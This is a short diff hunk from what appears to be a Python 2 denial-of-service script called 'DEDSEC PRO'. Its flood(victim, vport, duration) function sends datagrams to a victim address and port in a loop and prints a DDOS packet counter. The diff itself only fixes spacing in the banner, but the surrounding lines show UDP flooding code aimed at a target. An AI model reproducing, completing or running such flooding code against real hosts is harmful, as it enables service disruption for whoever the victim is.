@@ -21,7 +21,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "BYDEDSEC PRO %s DDOS %s port %s "%(sent, victim, vport)
+        print "BY DEDSEC PRO %s DDOS %s port %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
